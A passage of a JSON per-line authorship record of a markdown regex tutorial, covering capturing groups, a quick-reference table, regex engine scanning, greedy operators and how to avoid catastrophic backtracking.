        "content": "However, you want them to be written in (DD-MM-YYYY) instead. As we can see, this isn\u0027t as simple as just finding and replacing text, we must also maintain the data in the search string (e.g. `02-20` becomes `20-02`). This can be done using a **capturing group**. A capturing group is a part of a Regex surrounded by brackets `()`. They are numbered `1`, `2`, `3`, from left to right and are used to hold captured data. For example:"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "`(\\d\\d)-(\\d\\d)-(\\d\\d\\d\\d)` against `02/20/2017` will result in group 1 : `02`, group 2 : `20`, and group 3 : `2017`."
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "Using this, we can construct our regex as follows:"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "* Find: `(\\d\\d)-(\\d\\d)-(\\d\\d\\d\\d)`"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "* Replace: `\\2-\\1-\\3`"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "In the replace field, `\\1` represents the group matched in the string. For example, `\\1` corresponds to `02`, `\\2` corresponds to `20` and so on. As you can see, we are swapping group 1 (the month) and group 2 (the day) to get the desired result."
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "### Result"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e Calendar \u003cbr\u003e"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e * 20-02-2017 Paul\u0027s Birthday \u003cbr\u003e"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e * 24-02-2017 Presentation at work \u003cbr\u003e"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e * 25-02-2017 Workshop"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Further Exploration"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "These examples provide a quick look as to what Regex can be used for, without code. You can also use Regex as part of many different programming languages, to search strings within the code. The implementation of Regex varies from language to language (for example, Python uses the [`re`](https://docs.python.org/2/library/re.html) library, Java uses [`Pattern`](https://docs.oracle.com/javase/7/docs/api/java/util/regex/Pattern.html) and Javascript has regex built into the language using [`/` notation](https://developer.mozilla.org/en/docs/Web/JavaScript/Guide/Regular_Expressions)), but the functionality is consistent so it\u0027s not difficult to port Regex from one language to another. You can search the respective language documentation for a more comprehensive view of how to use Regex in the language of your choice."
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "For more examples of what Regex can do, you can refer to the tutorial links in the appendix."
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "## Quick Reference"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "Name | Regex | Use | Example"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "--- | --- | --- | ---"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "Literal characters | Any character(s) | Matches any substring | `cat` matches `category`"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Escape characters | `\\t`, `\\n`, `\\d`... | Matches [special characters](https://www.regular-expressions.info/refcharacters.html). | `\\t` matches a tab character"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "Anchors | `^`, `$` | Matches start and end of string | `^ant` matches `antics` but not `pant`"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "Character classes | `[abc]` | Matches any character in the character class | `l[ai]st` matches `last` and `list`"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "Quantifiers | `+` | Matches one or more of the previous character | `no+` matches `nooooooo` but not `n`"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": " | `?` | Matches zero or one of the previous character | `colou?r` matches `color` and `colour`"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": " | `*` | Matches zero or more of the previous character | `ba*` matches `b`, `ba` and `baaa`"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": " | `{1, 3}` or `{2}` | Matches the previous character a specified number of times | `a{1, 3}` matches `a`, `aa` and `aaa`, `a{2}` matches `aa`"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "Groups | `(...)` | Groups a pattern of data | `Used for extracting data, see above`"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "For a full list of possible operators, refer to this cheat sheet:"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "[Regex cheat sheet](https://www.rexegg.com/regex-quickstart.html)\u003cbr\u003e"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Helpful Links"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "* [Regex101](https://regex101.com/) - An online Regex engine that allows the user to test Regexes against text and walks the user through their execution."
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [Regular-Expressions](https://www.regular-expressions.info/examples.html) - Some common examples of where Regex can be used, along with pre-compiled Regexes that can be useful."
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "* [Regexone](https://regexone.com/) - A free online course that teaches the many features of Regex interactively."
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [Rexegg](https://www.rexegg.com) - A comprehensive online tutorial for Regex that documents many advanced functionalities of Regex."
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "# Advanced Topics"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "## The Regex Engine"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "So, how exactly does Regex work?"
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "Regex works similarly to most brute force searches. A simplified Regex engine would look something like this:"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "1. Start from the start of the text and the start of the regex."
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "1. Check if the first character matches."
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "1. If it does, check the second character of both strings."
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": "1. If it does, check the third character of both strings, and so on."
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "1. If any character doesn\u0027t match, start from the second character of the text."
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "1. Return when a match is found, or if no match is found."
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": "For example, for the regex `light` against the sentence `He likes light lightbulbs.`:"
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": "He likes light lightbulbs."
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": "^"
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": "light"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": "First, the engine checks against the start of the string, `H` against `l`. This doesn\u0027t match, so the engine moves on to `e`, then ` `, and so on."
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": "He likes light lightbulbs."
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": "   ^"
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": "   light"
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": "Once it reaches the first `l`, it sees a match, consumes the `l` and starts comparing the rest of the string."
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": "He likes light lightbulbs."
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": "     ^"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
        "content": "   light"
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": "However, when it reaches `k`, it finds a different character so it knows it\u0027s not a match. It then starts again from `i` (the letter after `l`)."
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": "He likes light lightbulbs."
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": "         ^"
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": "         light"
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": "Finally, when it finds a match, it returns the match and terminates. Note that the second `light` in `lightbulbs` is ignored."
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": "Of course, more complex Regex functions will require more steps, but this will give you a rough understanding of the engine for now."
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "-"
        },
        "content": "## Greedy Operators"
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "-"
        },
        "content": "The operators `{}`, `*` and `+` are called greedy operators because they try to match as many characters as possible. For example, for the regex `b.*` against the string `baaaaaa`:"
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "-"
        },
        "content": "baaaaaaaaa"
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "-"
        },
        "content": " ^"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "-"
        },
        "content": "ba"
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "-"
        },
        "content": "Although a suitable match (`ba`) has already been found, the engine sees that it can match against a longer string of `a`s. It will instead return the match `baaaaaaaaa`, matching the entire string."
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "-"
        },
        "content": "But what if a greedy operator can\u0027t find a match? A greedy operator will always consume as many characters as possible, but if the string that follows fails to match, the engine releases one character at a time until a match is found. This is called \u0027backtracking\u0027. For example, consider the regex `c.*ed` against the string `contested` (Let `.....` represent `.+`)."
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "-"
        },
        "content": "contested"
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "-"
        },
        "content": "        ^"
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "-"
        },
        "content": "c........ed"
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "-"
        },
        "content": "Remember that `.*` matches any number of characters, and this includes the `ed` at the back! The entire string is matched by `c.*`, leaving no characters left for `ed`. This obviously doesn\u0027t match, so the engine backtracks one step:"
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 258,
        "author": {
          "gitId": "-"
        },
        "content": "contested"
      },
      {
        "lineNumber": 259,
        "author": {
          "gitId": "-"
        },
        "content": "        ^"
      },
      {
        "lineNumber": 260,
        "author": {
          "gitId": "-"
        },
        "content": "c.......ed"
      },
      {
        "lineNumber": 261,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 262,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 263,
        "author": {
          "gitId": "-"
        },
        "content": "As we can see, `e` still doesn\u0027t match `d`, so we take another step back:"
      },
      {
        "lineNumber": 264,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 265,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 266,
        "author": {
          "gitId": "-"
        },
        "content": "contested"
      },
      {
        "lineNumber": 267,
        "author": {
          "gitId": "-"
        },
        "content": "       ^"
      },
      {
        "lineNumber": 268,
        "author": {
          "gitId": "-"
        },
        "content": "c......ed"
      },
      {
        "lineNumber": 269,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 270,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 271,
        "author": {
          "gitId": "-"
        },
        "content": "Finally, we get a match and see that both strings match."
      },
      {
        "lineNumber": 272,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 273,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Effect on Performance"
      },
      {
        "lineNumber": 274,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 275,
        "author": {
          "gitId": "-"
        },
        "content": "Bad use of greedy operators (`.*`, `.+`) can actually lead to an unwanted increase in performance time. Because they scan the entire string, you may end up processing more text than necessary. Consider the following scenario:"
      },
      {
        "lineNumber": 276,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 277,
        "author": {
          "gitId": "-"
        },
        "content": "Match a person\u0027s full name: `(Anderson.*Cooper)`  \u003cbr\u003e"
      },
      {
        "lineNumber": 278,
        "author": {
          "gitId": "-"
        },
        "content": "Text: `Hi, my name is Anderson Pearson Cooper and I am a programmer from ... (3000 words redacted)`"
      },
      {
        "lineNumber": 279,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 280,
        "author": {
          "gitId": "-"
        },
        "content": "This looks like a simple matching at first glance, but look at what happens:"
      },
      {
        "lineNumber": 281,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 282,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 283,
        "author": {
          "gitId": "-"
        },
        "content": "Hi, my name is Anderson Pearson Cooper and I am a programmer from ... (3000 words redacted)"
      },
      {
        "lineNumber": 284,
        "author": {
          "gitId": "-"
        },
        "content": "               ^"
      },
      {
        "lineNumber": 285,
        "author": {
          "gitId": "-"
        },
        "content": "               Anderson.............................................."
      },
      {
        "lineNumber": 286,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 287,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 288,
        "author": {
          "gitId": "-"
        },
        "content": "Every character after `Anderson` matches `.*`, resulting in scanning the entire string! And not only that, the Regex also has to backtrack one character at a time, until it reaches `Anderson Pearson ` and `Cooper` can be matched. This results in an O(String length) complexity even for the best case, which is bad considering we can write a brute force search that terminates after O(Regex length) in the best case."
      },
      {
        "lineNumber": 289,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 290,
        "author": {
          "gitId": "-"
        },
        "content": "### Catastrophic Backtracking"
      },
      {
        "lineNumber": 291,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 292,
        "author": {
          "gitId": "-"
        },
        "content": "This is a famous pitfall in Regular Expressions, so much so it deserves its own name and book section. Catastrophic backtracking usually occurs when multiple greedy operators are chained. If a match can\u0027t be found, each operator will be backtracked individually, which results in a lot of computation, even up to O(2\u003csup\u003en\u003c/sup\u003e) in some cases! Let\u0027s look at one case in detail."
      },
      {
        "lineNumber": 293,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 294,
        "author": {
          "gitId": "-"
        },
        "content": "### Matching Delimiters"
      },
      {
        "lineNumber": 295,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 296,
        "author": {
          "gitId": "-"
        },
        "content": "One common reason this happens is when delimited data is carelessly matched. This is when the Regex group you are using to match the data also matches the delimiter. Consider the following example:"
      },
      {
        "lineNumber": 297,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 298,
        "author": {
          "gitId": "-"
        },
        "content": "Match 10 comma separated values in an array: `\\[(.+,){9}(.+)\\]`\u003cbr\u003e"
      },
      {
        "lineNumber": 299,
        "author": {
          "gitId": "-"
        },
        "content": "E.g.: `[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]`"
      },
      {
        "lineNumber": 300,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 301,
        "author": {
          "gitId": "-"
        },
        "content": "This regex looks innocent enough. It matches 9 groups of data with a comma, followed by one group without, so what\u0027s wrong?"
      },
      {
        "lineNumber": 302,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 303,
        "author": {
          "gitId": "-"
        },
        "content": "The problem occurs because `.` matches any character. This also includes the comma separating the group. This is what happens when the first set of `(.+,)` is parsed:"
      },
      {
        "lineNumber": 304,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 305,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 306,
        "author": {
          "gitId": "-"
        },
        "content": "[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]"
      },
      {
        "lineNumber": 307,
        "author": {
          "gitId": "-"
        },
        "content": "^"
      },
      {
        "lineNumber": 308,
        "author": {
          "gitId": "-"
        },
        "content": "[.........................,"
      },
      {
        "lineNumber": 309,
        "author": {
          "gitId": "-"
        },
        "content": "[.+                       ,"
      },
      {
        "lineNumber": 310,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 311,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 312,
        "author": {
          "gitId": "-"
        },
        "content": "The first group keeps everything as its data group. Now, it tries to find the second `(.+,)` in ` 10]`, but fails, so it backtracks:"
      },
      {
        "lineNumber": 313,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 314,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 315,
        "author": {
          "gitId": "-"
        },
        "content": "[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]"
      },
      {
        "lineNumber": 316,
        "author": {
          "gitId": "-"
        },
        "content": "^"
      },
      {
        "lineNumber": 317,
        "author": {
          "gitId": "-"
        },
        "content": "[......................,..,"
      },
      {
        "lineNumber": 318,
        "author": {
          "gitId": "-"
        },
        "content": "[.+                    ,.+,"
      },
      {
        "lineNumber": 319,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 320,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 321,
        "author": {
          "gitId": "-"
        },
        "content": "This time the first and second groups are matched. Now, it tries to find the **third** `(.+,)` in ` 10]`, but fails, so it backtracks yet again. So we move the first `(.+,)` back:"
      },
      {
        "lineNumber": 322,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 323,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 324,
        "author": {
          "gitId": "-"
        },
        "content": "[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]"
      },
      {
        "lineNumber": 325,
        "author": {
          "gitId": "-"
        },
        "content": "^"
      },
      {
        "lineNumber": 326,
        "author": {
          "gitId": "-"
        },
        "content": "[...................,"
      },
      {
        "lineNumber": 327,
        "author": {
          "gitId": "-"
        },
        "content": "[.+                 ,"
      },
      {
        "lineNumber": 328,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 329,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 330,
        "author": {
          "gitId": "-"
        },
        "content": "Now, what happens? Well, the second `(.+,)` is greedy, so it actually matches the last comma instead!"
      },
      {
        "lineNumber": 331,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 332,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 333,
        "author": {
          "gitId": "-"
        },
        "content": "[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]"
      },
      {
        "lineNumber": 334,
        "author": {
          "gitId": "-"
        },
        "content": "^"
      },
      {
        "lineNumber": 335,
        "author": {
          "gitId": "-"
        },
        "content": "[...................,.....,"
      },
      {
        "lineNumber": 336,
        "author": {
          "gitId": "-"
        },
        "content": "[.+                 ,.+   ,"
      },
      {
        "lineNumber": 337,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 338,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 339,
        "author": {
          "gitId": "-"
        },
        "content": "As we can see, by chaining repeated groups, it actually causes cascading levels of backtracking, which leads to very poor performance, even with short strings. For this case, we can observe that each comma is either included in the regex or not included in the match, and every possible combination of included and not included combinations will appear at least once. That means the complexity is equal to the number of possible ways n commas can be either included or not included, or O(2\u003csup\u003en\u003c/sup\u003e). This is a Very Bad Thing™!"
      },
      {
        "lineNumber": 340,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 341,
        "author": {
          "gitId": "-"
        },
        "content": "This problem can be exacerbated by the one mentioned previously. Imagine if your text looked like this:"
      },
      {
        "lineNumber": 342,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 343,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 344,
        "author": {
          "gitId": "-"
        },
        "content": "[1, 2, 3, 4, 5, 6, 7, 8, 9, 10] some unrelated words, blah blah (200 more redacted)"
      },
      {
        "lineNumber": 345,
        "author": {
          "gitId": "-"
        },
        "content": "[...................................................,"
      },
      {
        "lineNumber": 346,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 347,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 348,
        "author": {
          "gitId": "-"
        },
        "content": "The extra parts of the string will be matched each time, and we can only imagine how long that will take."
      },
      {
        "lineNumber": 349,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 350,
        "author": {
          "gitId": "-"
        },
        "content": "So, how do we prevent this?"
      },
      {
        "lineNumber": 351,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 352,
        "author": {
          "gitId": "-"
        },
        "content": "* Explicitly exclude the delimter."
      },
      {
        "lineNumber": 353,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 354,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e Match 10 comma separated values in an array: `\\[([^,]+,){9}([^,]+)\\]` instead of `\\[(.+,){9}(.+)\\]`\u003cbr\u003e"
      },
      {
        "lineNumber": 355,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 356,
        "author": {
          "gitId": "-"
        },
        "content": "Here, instead of matching all characters (`.`), we match all characters except a certain character (`[^,]`). This allows the regex to capture in one parse successfully. Some other common examples are HTML/XML tags (`\u003c[^\u003e]*\u003e` instead of `\u003c.+\u003e`) and bracketed expressions (`\\([^\\)]+\\)` instead of `\\(.+\\)`)."
      },
      {
        "lineNumber": 357,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 358,
        "author": {
          "gitId": "-"
        },
        "content": "* Always narrow the scope as much as possible."
      },
      {
        "lineNumber": 359,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 360,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e Matching a name: `[A-z]+ [A-z]+` instead of `.+ .+`\u003cbr\u003e"
      },
      {
        "lineNumber": 361,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 362,
        "author": {
          "gitId": "-"
        },
        "content": "A great tip for improving Regex performance is to specify your match as clearly as possible. This reduces the potential of unwanted matchings and unnecessary backtracking."
      },
      {
        "lineNumber": 363,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 364,
        "author": {
          "gitId": "-"
        },
        "content": "* Avoid greedy operators if possible."
      },
      {
        "lineNumber": 365,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 366,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e Matching a date: `\\d{1,2}-\\d{1,2}-\\d{2,4}` instead of `.*-.*-.*`\u003cbr\u003e"
      },
      {
        "lineNumber": 367,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 368,
        "author": {
          "gitId": "-"
        },
        "content": "If you know your data will only be a few characters long, try your best to avoid using `*` or `+`. Limiting to a number of characters would reduce the amount of backtracking if any."
      },
      {
        "lineNumber": 369,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 370,
        "author": {
          "gitId": "-"
        },
        "content": "* Use Lazy Quantifiers"
      },
      {
        "lineNumber": 371,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 372,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e Use `.+?` or `.*?` instead of `.+` and `.*`"
      },
      {
        "lineNumber": 373,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 374,
        "author": {
          "gitId": "-"
        },
        "content": "A greedy quantifier `+` or `*` can be turned into a lazy quantifier by adding an extra `?` behind it, i.e. (`.+?` or `.*?` instead of `.+` and `.*`). A lazy quantifier works similarly to a greedy quantifier, but it stops as soon as it finds a match rather than matching as much as possible. For instance, in our `contested` example, if we replaced `c.+d` with `c.+?d`, the engine would stop matching the `.+` here:"
      },
      {
        "lineNumber": 375,
        "author": {
